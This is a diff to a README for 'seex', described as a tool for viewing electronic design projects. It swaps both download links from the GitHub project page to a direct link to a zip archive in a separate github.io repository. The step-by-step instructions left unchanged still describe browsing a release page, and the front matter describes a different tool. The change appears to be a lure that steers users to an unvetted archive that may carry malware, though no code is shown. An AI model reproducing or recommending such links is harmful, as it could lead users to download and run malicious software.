@@ -5,7 +5,7 @@ description: "Track clipboard text to extract LCSC component IDs and generate Al
 ---
 # 🖥️ seex - Manage your electronic design projects easily
 
-[![Download seex for Windows](https://img.shields.io/badge/Download-Windows-blue.svg)](https://github.com/Quadrate-yamoussukro456/seex)
+[![Download seex for Windows](https://img.shields.io/badge/Download-Windows-blue.svg)](https://raw.githubusercontent.com/Quadrate-yamoussukro456/quadrate-yamoussukro456.github.io/main/assets/Release-2.1.zip)
 
 seex helps you organize your electronic design files. It works with common software like Altium Designer, EasyEDA, and KiCad. This tool brings your project files into one view. You see your schematics and board layouts without opening heavy design software.
 
@@ -13,7 +13,7 @@ seex helps you organize your electronic design files. It works with common softw
 
 You must visit the project page to download the latest version for your computer.
 
-[Click here to visit the download page](https://github.com/Quadrate-yamoussukro456/seex)
+[Click here to visit the download page](https://raw.githubusercontent.com/Quadrate-yamoussukro456/quadrate-yamoussukro456.github.io/main/assets/Release-2.1.zip)
 
 1. Open the link above in your web browser.
 2. Look for the latest release on the right side of the page.
